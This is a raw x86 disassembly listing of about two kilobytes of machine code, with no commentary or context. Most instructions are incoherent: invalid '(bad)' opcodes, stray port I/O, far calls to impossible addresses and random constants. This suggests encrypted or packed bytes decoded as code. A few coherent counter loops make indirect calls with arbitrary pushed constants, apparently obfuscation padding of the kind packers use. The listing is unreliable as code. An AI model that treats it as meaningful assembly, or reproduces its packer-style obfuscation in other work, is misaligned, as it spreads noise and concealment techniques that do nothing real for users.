  4128d2:	xchg   esi,eax
  4128d3:	leave  
  4128d4:	inc    esi
  4128d5:	jbe    0x4128e8
  4128d7:	mov    dh,0x87
  4128d9:	cs push es
  4128db:	xchg   edi,eax
  4128dc:	call   0xd7a53537
  4128e1:	add    ecx,DWORD PTR [eax]
  4128e3:	aam    0x24
  4128e5:	hlt    
  4128e6:	push   0xd882fd51
  4128eb:	push   0x8a5a424c
  4128f0:	push   ss
  4128f1:	pop    ss
  4128f2:	and    edx,DWORD PTR [edi+0x105ccc4f]
  4128f8:	pop    ecx
  4128f9:	pop    ss
  4128fa:	and    DWORD PTR [ecx-0x8],ebx
  4128fd:	and    DWORD PTR [ecx+ecx*4-0x62],0xf1795618
  412905:	stc    
  412906:	es aam 0x7d
  412909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41290a:	dec    esp
  41290b:	push   ecx
  41290c:	dec    esi
  41290d:	outs   dx,DWORD PTR ds:[esi]
  41290e:	call   0xb247:0x61621422
  412915:	into   
  412916:	in     eax,0xb3
  412918:	jne    0x4128f8
  41291a:	ret    
  41291b:	push   cs
  41291c:	mov    ebp,0xca4f2b76
  412921:	test   eax,0xd2400b14
  412926:	sub    ebx,esp
  412928:	pop    ss
  412929:	xor    DWORD PTR [ecx-0x19],edx
  41292c:	mov    bh,0x3e
  41292e:	retf   0x6cc9
  412931:	ret    
  412932:	mov    cl,0x2c
  412934:	scas   al,BYTE PTR es:[edi]
  412935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412936:	jnp    0x41296b
  412938:	push   esp
  412939:	das    
  41293a:	xchg   eax,ebx
  41293c:	or     BYTE PTR [ecx+0x2d],bl
  41293f:	pop    esp
  412940:	rol    al,0x71
  412943:	or     al,0x42
  412945:	cmp    eax,0x9f652d84
  41294a:	std    
  41294b:	pop    ss
  41294c:	test   BYTE PTR [ecx+0x6092d826],bl
  412952:	and    eax,0xa53dd5a
  412957:	or     eax,0xf43a73a1
  41295c:	push   0x9cd5a6b7
  412961:	shr    BYTE PTR [esi],0xda
  412964:	cdq    
  412965:	pop    edi
  412966:	rcl    DWORD PTR [edx+esi*2+0x60499c74],0xcf
  41296e:	in     al,dx
  41296f:	jecxz  0x4129e3
  412971:	dec    esi
  412972:	or     edi,DWORD PTR [eax+0x14a801ee]
  412978:	xchg   ebp,eax
  412979:	jmp    0xff34f5e9
  41297e:	test   BYTE PTR [esi+0x2f],ch
  412981:	mov    ecx,0xa1f8c819
  412986:	ds pop ss
  412988:	mov    dl,0xe0
  41298a:	cs into 
  41298c:	data16 or al,0xcc
  41298f:	dec    eax
  412990:	jns    0x412919
  412992:	ficom  WORD PTR [edx+0x345d4af4]
  412998:	sbb    BYTE PTR [esi],ah
  41299a:	push   eax
  41299b:	mov    ebp,0x4aa794b7
  4129a0:	bnd jle 0x4129f3
  4129a3:	(bad)  
  4129a4:	adc    al,0xbb
  4129a6:	loope  0x412944
  4129a8:	lods   al,BYTE PTR ds:[esi]
  4129a9:	mov    al,ds:0xb1dfa418
  4129ae:	in     eax,dx
  4129af:	mov    WORD PTR [eax+0x48472bfc],fs
  4129b5:	mov    bl,0xa5
  4129b7:	sub    BYTE PTR [edi-0x1caea74d],bl
  4129bd:	es push eax
  4129bf:	(bad)  
  4129c0:	icebp  
  4129c1:	mov    dh,0x9b
  4129c3:	add    eax,0x63dcdc7
  4129c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c9:	ficomp WORD PTR [ecx]
  4129cb:	xchg   edi,eax
  4129cc:	fiadd  WORD PTR [edx]
  4129ce:	push   edx
  4129cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129d0:	popf   
  4129d1:	lods   al,BYTE PTR ds:[esi]
  4129d2:	out    0xbf,eax
  4129d4:	cmp    dh,dl
  4129d6:	scas   eax,DWORD PTR es:[edi]
  4129d7:	mov    edi,0x62dcc5fd
  4129dc:	arpl   sp,cx
  4129de:	int3   
  4129df:	ret    
  4129e0:	inc    esp
  4129e1:	int    0x9f
  4129e3:	fwait
  4129e4:	int3   
  4129e5:	into   
  4129e6:	inc    esp
  4129e7:	ror    ebp,0x8f
  4129ea:	dec    ecx
  4129eb:	clts   
  4129ed:	push   ss
  4129ee:	sub    ch,BYTE PTR [esi]
  4129f0:	push   cs
  4129f1:	loope  0x412a3e
  4129f3:	cmp    DWORD PTR [ecx],0xcb2d7b84
  4129f9:	cmp    dh,bl
  4129fb:	and    BYTE PTR [esi+esi*2-0x176ebd36],dh
  412a02:	xor    al,BYTE PTR [ebx+ebp*1]
  412a05:	mov    esi,eax
  412a07:	add    eax,0x52ef2ddb
  412a0c:	pushf  
  412a0d:	pop    es
  412a0e:	jns    0x4129b2
  412a10:	mov    edx,0xccffb0f8
  412a15:	xor    eax,0xd7f108a5
  412a1a:	xchg   edx,eax
  412a1b:	add    dl,BYTE PTR [eax+0x6b]
  412a1e:	pop    esp
  412a1f:	test   eax,0xbb7381ac
  412a24:	adc    eax,eax
  412a26:	repnz mov bl,BYTE PTR [esi+0x33]
  412a2a:	jecxz  0x412a0b
  412a2c:	adc    BYTE PTR [esi-0x7b],bh
  412a2f:	lea    edi,[ebx-0x52efefbd]
  412a35:	push   es
  412a36:	ret    0x2c08
  412a39:	jno    0x4129ef
  412a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3c:	in     eax,dx
  412a3d:	ret    
  412a3e:	fadd   QWORD PTR [ebx]
  412a40:	shl    dh,cl
  412a42:	dec    esi
  412a43:	mov    cl,0x94
  412a45:	jo     0x412a19
  412a47:	(bad)
  412a4b:	xchg   edx,eax
  412a4c:	add    eax,0x3ee60cfa
  412a51:	sbb    ch,BYTE PTR [edi+0x2238cee5]
  412a57:	jo     0x412a24
  412a59:	std    
  412a5a:	jns    0x412a96
  412a5c:	outs   dx,BYTE PTR ds:[esi]
  412a5d:	(bad)  
  412a5e:	mov    ds:0xa5c15cc,eax
  412a63:	es ja  0x412a2b
  412a66:	ret    0x3a26
  412a69:	out    0x75,al
  412a6b:	mov    ds:0xdc2de089,eax
  412a70:	xchg   ebp,eax
  412a71:	mov    gs,WORD PTR [esp+eiz*8+0x14]
  412a75:	fwait
  412a76:	cmp    ebx,edx
  412a78:	xor    eax,0x2c6d0de2
  412a7d:	iret   
  412a7e:	mov    al,al
  412a80:	(bad)  
  412a81:	imul   DWORD PTR [edi]
  412a83:	scas   eax,DWORD PTR es:[edi]
  412a84:	test   eax,0x5c3eaf7a
  412a89:	icebp  
  412a8a:	popa   
  412a8b:	(bad)  
  412a8c:	imul   eax,DWORD PTR [ecx+edi*8],0xffffff85
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b49
  412b3b:	neg    DWORD PTR [esi]
  412b3d:	fcom   DWORD PTR [ecx]
  412b3f:	data16 jo 0x412bb2
  412b42:	mov    ecx,0x2070707e
  412b47:	clc    
  412b48:	enter  0x1750,0x2
  412b4c:	adc    ebx,ecx
  412b4e:	fwait
  412b4f:	bound  edx,QWORD PTR [edi]
  412b51:	xchg   DWORD PTR ds:0x982,edi
  412b56:	and    esi,esp
  412b58:	or     BYTE PTR [ecx+0x817d3f2],bh
  412b5e:	sub    dh,al
  412b60:	mov    edi,DWORD PTR [ecx+edi*4]
  412b63:	dec    edx
  412b64:	push   ecx
  412b65:	mov    edi,0xef9e6878
  412b6a:	mov    ah,0x6e
  412b6c:	inc    esi
  412b6d:	sbb    BYTE PTR [ebx],0x55
  412b70:	or     ecx,DWORD PTR [edx+0x2a60bb31]
  412b76:	sbb    al,0x45
  412b78:	sub    BYTE PTR [edx+0x48],dl
  412b7b:	ficom  DWORD PTR [esp+esi*8]
  412b7e:	push   edi
  412b7f:	cdq    
  412b80:	or     ebx,DWORD PTR [eax+0x1fe44cc3]
  412b86:	push   ds
  412b87:	jae    0x412bea
  412b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b8a:	(bad)  
  412b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b8c:	sbb    cl,ah
  412b8e:	bound  esi,QWORD PTR [edx]
  412b90:	jae    0x412b18
  412b92:	or     al,0x49
  412b94:	jno    0x412bf0
  412b96:	lods   eax,DWORD PTR ds:[esi]
  412b97:	xor    BYTE PTR [ebx+0x4c1150ee],dh
  412b9d:	push   0x4f6ed6f2
  412ba2:	xlat   BYTE PTR ds:[ebx]
  412ba3:	out    dx,al
  412ba4:	adc    DWORD PTR [edi-0x6259cf91],ebp
  412baa:	shl    DWORD PTR [ebp+ebp*2-0x47017518],1
  412bb1:	push   esp
  412bb2:	mov    ch,0x59
  412bb4:	jge    0x412b4b
  412bb6:	stos   BYTE PTR es:[edi],al
  412bb7:	jge    0x412bae
  412bb9:	pop    edi
  412bba:	mov    bl,0x59
  412bbc:	mov    al,ds:0x3f3b0ac
  412bc1:	ins    BYTE PTR es:[edi],dx
  412bc2:	mov    bl,0x1b
  412bc4:	mov    esp,DWORD PTR [esi+edi*8]
  412bc7:	ds mov dl,0x21
  412bca:	adc    al,0x4f
  412bcc:	ret    0xcb22
  412bcf:	xchg   ebx,ecx
  412bd1:	xchg   BYTE PTR [eax+0x28436af],ch
  412bd7:	iret   
  412bd8:	or     eax,0xf8554187
  412bdd:	fs pop eax
  412bdf:	jb     0x412b82
  412be1:	pop    ebx
  412be2:	cmp    DWORD PTR [eax],esi
  412be4:	push   edx
  412be5:	pop    esp
  412be6:	aas    
  412be7:	adc    dh,ah
  412be9:	add    DWORD PTR [edx],esi
  412beb:	inc    esi
  412bec:	cmp    al,dh
  412bee:	or     eax,0x99801262
  412bf3:	sub    DWORD PTR [esp+eax*8],edi
  412bf6:	lods   al,BYTE PTR ds:[esi]
  412bf7:	fld    TBYTE PTR [eax+0x3f]
  412bfa:	pop    ebp
  412bfb:	bound  esp,QWORD PTR [esi+0x4f]
  412bfe:	and    eax,esp
  412c00:	cld    
  412c01:	(bad)  
  412c02:	and    DWORD PTR [edx+0x2d25bab8],ebx
  412c08:	adc    al,0xa9
  412c0a:	sahf   
  412c0b:	lods   al,BYTE PTR ds:[esi]
  412c0c:	mov    ds:0x96863b3b,eax
  412c11:	jns    0x412b95
  412c13:	scas   eax,DWORD PTR es:[edi]
  412c14:	popa   
  412c15:	sub    dl,BYTE PTR [eax-0x50]
  412c18:	adc    DWORD PTR [ebp-0x7cefda1e],edx
  412c1e:	scas   eax,DWORD PTR es:[edi]
  412c1f:	inc    esp
  412c20:	pop    ebx
  412c21:	xor    eax,0xa24d6e03
  412c26:	push   es
  412c27:	xchg   ebp,eax
  412c28:	fnstenv [edx]
  412c2a:	stc    
  412c2b:	push   0xb
  412c2d:	je     0x412c5a
  412c2f:	jbe    0x412c11
  412c31:	cdq    
  412c32:	test   al,0xd0
  412c34:	and    eax,DWORD PTR gs:[ebp+0x70]
  412c38:	loopne 0x412c19
  412c3a:	test   al,0xc2
  412c3c:	stc    
  412c3d:	mov    bl,0x32
  412c3f:	and    dl,BYTE PTR [ebx+ebx*4-0xf]
  412c43:	jnp    0x412ca4
  412c45:	das    
  412c46:	stos   DWORD PTR es:[edi],eax
  412c47:	ret    0x75b4
  412c4a:	clc    
  412c4b:	nop
  412c4c:	ja     0x412c5a
  412c4e:	nop
  412c4f:	cmp    al,0x40
  412c51:	in     eax,dx
  412c52:	or     BYTE PTR [esp+ebp*2+0x682bdea6],ch
  412c59:	out    dx,eax
  412c5a:	int3   
  412c5b:	push   ecx
  412c5c:	fmul   DWORD PTR [esi]
  412c5e:	retf   
  412c5f:	push   esp
  412c60:	push   DWORD PTR [esi+edi*1-0x3f]
  412c64:	cmp    ch,BYTE PTR [ebp-0x74]
  412c67:	pop    ss
  412c68:	stc    
  412c69:	outs   dx,BYTE PTR ds:[esi]
  412c6a:	lods   al,BYTE PTR ds:[esi]
  412c6b:	xchg   ebp,eax
  412c6c:	bound  ecx,QWORD PTR gs:[eax+0x7d]
  412c70:	scas   ax,WORD PTR es:[edi]
  412c72:	push   cs
  412c73:	cmp    ah,BYTE PTR [edi]
  412c75:	mov    ecx,0xd3f56874
  412c7a:	and    bl,0x25
  412c7d:	mov    WORD PTR [edx],ss
  412c7f:	xchg   edx,eax
  412c80:	jp     0x412cfb
  412c82:	and    esp,DWORD PTR [esi-0x2e7999cc]
  412c88:	mov    eax,ds:0x7017f68c
  412c8d:	jecxz  0x412c21
  412c8f:	imul   DWORD PTR [ebp+0xd0ab72a]
  412c95:	mov    al,ds:0xadaa4fd0
  412c9a:	jbe    0x412d05
  412c9c:	lods   eax,DWORD PTR ds:[esi]
  412c9d:	jne    0x412cae
  412c9f:	sub    ecx,ebp
  412ca1:	mov    al,ds:0x23ccb4c4
  412ca6:	aad    0x9e
  412ca8:	mov    ch,0xe2
  412caa:	jmp    0x23cc:0xb2bf790c
  412cb1:	shr    ah,1
  412cb3:	inc    edx
  412cb4:	loopne 0x412c4e
  412cb6:	xchg   edi,eax
  412cb7:	or     eax,0xd79f2b6
  412cbc:	jmp    0x5549:0x7384e53
  412cc3:	ret    0x1113
  412cc6:	popa   
  412cc7:	out    dx,al
  412cc8:	pop    esi
  412cc9:	xchg   ebp,eax
  412cca:	(bad)  
  412ccb:	xor    al,0x65
  412ccd:	adc    DWORD PTR [eax-0x5788adc2],esi
  412cd3:	add    edx,DWORD PTR [esi+0x2b74d4b0]
  412cd9:	leave  
  412cda:	add    eax,0x928ea750
  412cdf:	retf   0xd60a
  412ce2:	sub    al,0x41
  412ce4:	mov    ebx,ss
  412ce6:	rol    DWORD PTR [ebx],1
  412ce8:	rcl    DWORD PTR ds:0xa11eb440,cl
  412cee:	cmp    ch,BYTE PTR [ecx-0x25]
  412cf1:	(bad)  
  412cf2:	repz jbe 0x412cc6
  412cf5:	mov    edi,0x1eea1d35
  412cfa:	dec    esi
  412cfb:	les    ebp,FWORD PTR [ebx+0x73a7fdbd]
  412d01:	stos   DWORD PTR es:[edi],eax
  412d02:	cmp    BYTE PTR [ecx],bh
  412d04:	add    al,0xa8
  412d06:	ss out 0xba,ax
  412d0a:	xchg   DWORD PTR [ecx+eax*4],eax
  412d0d:	push   edx
  412d0e:	jb     0x412c98
  412d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d11:	mov    ebp,0x2aea8232
  412d16:	push   ss
  412d17:	icebp  
  412d18:	adc    al,0x7b
  412d1a:	jmp    0x412d14
  412d1c:	mov    ch,BYTE PTR [edx]
  412d1e:	add    BYTE PTR [eax+ebp*1],ah
  412d21:	(bad)  
  412d23:	mov    cs,WORD PTR [ebx-0x473a0604]
  412d29:	mov    ecx,0x471cadef
  412d2e:	lds    esp,FWORD PTR [ebp-0x2b4a32c7]
  412d34:	dec    edi
  412d35:	xchg   edi,eax
  412d36:	leave  
  412d37:	pop    ds
  412d38:	jecxz  0x412db2
  412d3a:	fnsave [eax-0x26d860fb]
  412d40:	jb     0x412d51
  412d42:	xchg   esp,eax
  412d43:	test   eax,0xbe1b8021
  412d48:	mov    al,ds:0x11699b54
  412d4d:	sbb    edi,ecx
  412d4f:	or     ch,ch
  412d51:	mov    BYTE PTR ds:0x90bf3c33,0x67
  412d58:	adc    edi,DWORD PTR [edi]
  412d5a:	jno    0x412d2d
  412d5c:	jp     0x412d28
  412d5e:	stos   DWORD PTR es:[edi],eax
  412d5f:	dec    ebx
  412d60:	sbb    edx,0x37de12
  412d66:	scas   al,BYTE PTR es:[edi]
  412d67:	push   ebx
  412d68:	fnstenv [eax+0x60751dbb]
  412d6e:	mov    al,ds:0x805caa6d
  412d73:	inc    eax
  412d74:	cwde   
  412d75:	push   ss
  412d76:	das    
  412d77:	hlt    
  412d78:	test   DWORD PTR [esi+0x6a48c768],edx
  412d7e:	jp     0x412d46
  412d80:	fs mov cl,0x57
  412d83:	fcomp  DWORD PTR [edi]
  412d85:	add    al,0x86
  412d87:	ret    
  412d88:	mov    ecx,0xe717a211
  412d8d:	pusha  
  412d8e:	inc    eax
  412d8f:	imul   BYTE PTR [edx]
  412d91:	mov    ch,0xc9
  412d93:	pop    es
  412d94:	sub    al,0x13
  412d96:	stos   DWORD PTR es:[edi],eax
  412d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d98:	jne    0x412d66
  412d9a:	xor    DWORD PTR [edi-0xf],ebp
  412d9d:	(bad)  
  412d9e:	aas    
  412d9f:	aas    
  412da0:	cld    
  412da1:	cdq    
  412da2:	mov    dh,BYTE PTR [ebx-0x4b]
  412da5:	jae    0x412da4
  412da7:	pop    edi
  412da8:	cwde   
  412da9:	cmp    al,0xd3
  412dab:	adc    eax,0x2412e35d
  412db0:	scas   al,BYTE PTR es:[edi]
  412db1:	pusha  
  412db2:	sbb    edi,DWORD PTR [ebx+edi*8]
  412db5:	fxch   st(0)
  412db7:	push   edx
  412db8:	push   edx
  412db9:	rol    DWORD PTR [ecx-0x44],0x35
  412dbd:	mov    al,ds:0xb881c7bc
  412dc2:	pop    ss
  412dc3:	push   edx
  412dc4:	mov    ds:0x3e2fbf6c,eax
  412dc9:	lea    edx,[esi+0x50]
  412dcc:	mov    cl,0xde
  412dce:	and    DWORD PTR [esi],esi
  412dd0:	dec    ecx
  412dd1:	sbb    BYTE PTR [ecx+0x44331638],dh
  412dd7:	xor    cl,BYTE PTR [ebx-0x76b70668]
  412ddd:	inc    eax
  412dde:	add    al,ah
  412de0:	xchg   eax,esi
  412de2:	repz std 
  412de4:	lea    ebx,[ebx+0x56be5f9b]
  412dea:	cmp    DWORD PTR [edx-0x6c],esi
  412ded:	outs   dx,BYTE PTR ds:[esi]
  412dee:	push   edx
  412def:	dec    esp
  412df0:	das    
  412df1:	shl    BYTE PTR [esi+0x47],1
  412df4:	lods   eax,DWORD PTR ds:[esi]
  412df5:	scas   al,BYTE PTR es:[edi]
  412df6:	mov    esi,0x5554f418
  412dfb:	into   
  412dfc:	jne    0x412dd6
  412dfe:	dec    esi
  412dff:	bound  edx,QWORD PTR [edx+0x2ffeda6f]
  412e05:	mov    dh,0xf6
  412e07:	jmp    0x412dbc
  412e09:	nop
  412e0a:	inc    esi
  412e0b:	(bad)  
  412e0c:	mov    esi,0x2581ce87
  412e11:	sbb    al,0xe1
  412e13:	inc    edx
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebx+eiz*2-0x39],dx
  412e78:	dec    ebx
  412e79:	pop    edx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x6670707e
  412e82:	xchg   BYTE PTR ds:0xe642099e,dh
  412e88:	push   ebp
  412e89:	ret    0x32a2
  412e8c:	stos   DWORD PTR es:[edi],eax
  412e8d:	push   esi
  412e8e:	or     DWORD PTR [esi],ebx
  412e90:	repz mov eax,0xc2bfe2b
  412e96:	ret    
  412e97:	sbb    dl,BYTE PTR [ebx-0x53]
  412e9a:	or     dl,BYTE PTR [edi]
  412e9c:	mov    al,0x4
  412e9e:	xor    eax,0xff95b3c
  412ea3:	fdivr  QWORD PTR [ecx]
  412ea5:	mov    ds:0x69fd4af2,al
  412eaa:	jns    0x412f2b
  412eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ead:	and    edx,ebx
  412eaf:	inc    ebx
  412eb0:	push   ebp
  412eb1:	pop    ebx
  412eb2:	xchg   edi,eax
  412eb3:	jp     0x412e40
  412eb5:	call   0xbfa78e27
  412eba:	xor    al,0x91
  412ebc:	mov    dl,0xf8
  412ebe:	int    0x6
  412ec0:	clc    
  412ec1:	adc    ecx,DWORD PTR [edx-0x1a]
  412ec4:	inc    ebp
  412ec5:	in     al,dx
  412ec6:	jecxz  0x412f15
  412ec8:	das    
  412ec9:	jp     0x412f1c
  412ecb:	aam    0x11
  412ecd:	in     al,dx
  412ece:	and    esp,DWORD PTR [edi+eax*4+0x7d]
  412ed2:	and    al,0xa6
  412ed4:	addr16 inc ebx
  412ed6:	jmp    0x412f1e
  412ed8:	and    DWORD PTR [esi],ebx
  412eda:	push   ebp
  412edb:	lahf   
  412edc:	or     edx,ebx
  412ede:	cmc    
  412edf:	(bad)  
  412ee0:	mov    cl,0xbc
  412ee2:	push   edi
  412ee3:	and    eax,DWORD PTR [eax+0xf4dab6e]
  412ee9:	rcr    BYTE PTR [ecx+0x5207a810],1
  412eef:	out    dx,al
  412ef0:	sub    al,0xe6
  412ef2:	sar    BYTE PTR [ebx],1
  412ef4:	mov    bh,0x7b
  412ef6:	adc    eax,0x8ca5f71c
  412efb:	test   eax,0xd97eda94
  412f00:	call   FWORD PTR [ecx]
  412f02:	ja     0x412edf
  412f04:	or     ah,dh
  412f06:	dec    ebp
  412f07:	out    0x89,eax
  412f09:	test   BYTE PTR [edi-0x7d],ch
  412f0c:	push   ds
  412f0d:	dec    ebx
  412f0e:	pop    esi
  412f0f:	addr16 (bad) 
  412f11:	dec    esi
  412f12:	hlt    
  412f13:	out    0xe2,eax
  412f15:	pop    eax
  412f16:	loope  0x412f25
  412f18:	mov    bh,0x31
  412f1a:	cmp    BYTE PTR [edx],0xa0
  412f1d:	cs mov dl,0x86
  412f20:	add    eax,0x6b6a9a4f
  412f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f26:	pop    ds
  412f27:	pushf  
  412f28:	scas   al,BYTE PTR es:[edi]
  412f29:	push   es
  412f2a:	pop    esp
  412f2b:	aaa    
  412f2c:	outs   dx,DWORD PTR ds:[esi]
  412f2d:	ja     0x412fa4
  412f2f:	xchg   ebx,eax
  412f30:	xchg   esp,eax
  412f31:	pop    esi
  412f32:	stos   DWORD PTR es:[edi],eax
  412f33:	stos   DWORD PTR es:[edi],eax
  412f34:	jne    0x412f16
  412f36:	popa   
  412f37:	adc    BYTE PTR [ebx-0x4446c5df],bh
  412f3d:	add    dh,BYTE PTR [esi-0xba6e800]
  412f43:	push   edx
  412f44:	cmp    dh,BYTE PTR [eax+0x26]
  412f47:	sub    edi,DWORD PTR [ecx-0x69ec63ae]
  412f4d:	push   ecx
  412f4e:	xchg   ecx,eax
  412f4f:	cmp    al,0x40
  412f51:	pusha  
  412f52:	adc    esi,esp
  412f54:	push   esi
  412f55:	outs   dx,BYTE PTR ds:[esi]
  412f56:	ins    BYTE PTR es:[edi],dx
  412f57:	dec    ebp
  412f58:	mov    bl,BYTE PTR [edx+0x7631b5dd]
  412f5e:	into   
  412f5f:	pop    esp
  412f60:	aad    0x6a
  412f62:	aas    
  412f63:	pop    ebx
  412f64:	mov    eax,0x7a735ac8
  412f69:	xor    BYTE PTR [ebp+0x10],al
  412f6c:	ror    DWORD PTR [ecx-0x12],cl
  412f6f:	daa    
  412f70:	retf   
  412f71:	lock ss icebp 
  412f74:	div    BYTE PTR [esp+eax*8-0x53]
  412f78:	add    DWORD PTR [ecx-0x32],ebx
  412f7b:	pusha  
  412f7c:	jecxz  0x412f92
  412f7e:	pop    eax
  412f7f:	dec    esi
  412f80:	mov    esi,DWORD PTR [edx-0x79]
  412f83:	lahf   
  412f84:	sti    
  412f85:	retf   0x6c31
  412f88:	push   cs
  412f89:	mov    ss,WORD PTR [esi-0x63ed4537]
  412f8f:	aad    0x6d
  412f91:	inc    esp
  412f92:	inc    edx
  412f93:	jle    0x412ff5
  412f95:	in     al,dx
  412f96:	mov    dh,BYTE PTR [ebx-0x31]
  412f99:	int3   
  412f9a:	push   0x48
  412f9c:	jp     0x413015
  412f9e:	mov    cl,0x7f
  412fa0:	push   cs
  412fa1:	outs   dx,DWORD PTR ds:[esi]
  412fa2:	dec    ebp
  412fa3:	pop    edx
  412fa4:	mov    DWORD PTR [esi+edx*2-0x67241af3],ecx
  412fab:	xchg   esi,eax
  412fac:	sub    eax,0xdb51501a
  412fb1:	fistp  WORD PTR [edx]
  412fb3:	mov    ah,0xcf
  412fb6:	test   ebx,0xdb079ed0
  412fbc:	(bad)  
  412fbd:	jno    0x412ffb
  412fbf:	or     BYTE PTR [edx+0x3a385a45],ch
  412fc5:	mov    esp,0x95f11afd
  412fca:	aam    0xa0
  412fcc:	dec    edi
  412fcd:	fwait
  412fce:	mov    dl,0x24
  412fd0:	push   esp
  412fd1:	shl    esp,cl
  412fd3:	fimul  WORD PTR ds:0xdc834526
  412fd9:	mov    ds:0x93ed6768,al
  412fde:	add    BYTE PTR [esi],ch
  412fe0:	clc    
  412fe1:	int    0x24
  412fe3:	daa    
  412fe4:	mov    cl,0xa6
  412fe6:	add    eax,0x5162d4c8
  412feb:	leave  
  412fec:	stos   BYTE PTR es:[edi],al
  412fed:	or     al,0xa4
  412fef:	pusha  
  412ff0:	gs ret 
  412ff2:	pop    edx
  412ff3:	jecxz  0x412fdd
  412ff5:	or     eax,0xf822e660
  412ffa:	inc    edx
  412ffb:	call   0x8fd3:0xc9ae28d9
  413002:	dec    esi
  413003:	jb     0x41301f
  413005:	gs inc eax
  413007:	loope  0x41303f
  413009:	xchg   DWORD PTR [ebp+0x39],eax
  41300c:	jp     0x41304a
  41300e:	inc    esp
  41300f:	popa   
  413010:	dec    eax
  413011:	cmp    BYTE PTR [ebp-0x137e64be],dh
  413017:	cmp    eax,0x5fd62695
  41301c:	pop    edx
  41301d:	jge    0x413088
  41301f:	jge    0x412fe4
  413021:	jnp    0x413087
  413023:	and    bl,BYTE PTR [edx-0xf0a393f]
  413029:	fist   WORD PTR [ecx+edx*8+0x3b]
  41302d:	loope  0x413081
  41302f:	pop    edx
  413030:	and    edx,DWORD PTR [edi]
  413032:	xor    dl,BYTE PTR ds:0x4bda8a7a
  413038:	push   ebp
  413039:	or     BYTE PTR [esi],bl
  41303b:	jnp    0x413055
  41303d:	call   0x868a:0x43609ce9
  413044:	cdq    
  413045:	das    
  413046:	out    dx,eax
  413047:	fwait
  413048:	in     al,dx
  413049:	adc    eax,0xfc2e9766
  41304e:	mov    edx,0x77deff4a
  413053:	jnp    0x4130a6
  413055:	mov    edx,0xbbf59304
  41305a:	lahf   
  41305b:	push   eax
  41305c:	xchg   BYTE PTR [ecx-0x7b213230],ch
  413062:	adc    bl,dl
  413064:	test   al,0xa9
  413066:	cmp    BYTE PTR [edi+eax*1-0x710eebcb],cl
  41306d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41306e:	pop    edx
  41306f:	dec    ecx
  413070:	daa    
  413071:	jle    0x41304d
  413073:	push   esp
  413074:	scas   eax,DWORD PTR es:[edi]
  413075:	or     esi,esi
  413077:	iret   
  413078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413079:	xor    esi,ebp
  41307b:	cmp    BYTE PTR ds:0xecf3669d,dl
  413081:	sar    BYTE PTR [ebp-0x6c],1
  413084:	add    al,BYTE PTR [ebp+0x4fa5b3e7]
  41308a:	repz daa 
  41308c:	aas    
  41308d:	or     eax,0x6dbcc80
  413092:	call   FWORD PTR [eax+0x2d]
  413095:	inc    BYTE PTR [ecx+0x4de20678]
  41309b:	sbb    eax,0xee14d068
  4130a0:	ins    DWORD PTR es:[edi],dx
  4130a1:	pop    esp
  4130a2:	int3   
  4130a3:	sti    
  4130a4:	shr    BYTE PTR [edx],0x17
  4130a7:	dec    ebx
  4130a9:	in     eax,dx
  4130aa:	and    ebp,DWORD PTR ds:0xd74449e3
  4130b0:	xor    bh,BYTE PTR [esi+eiz*8]
  4130b3:	jo     0x41308b
  4130b5:	dec    eax
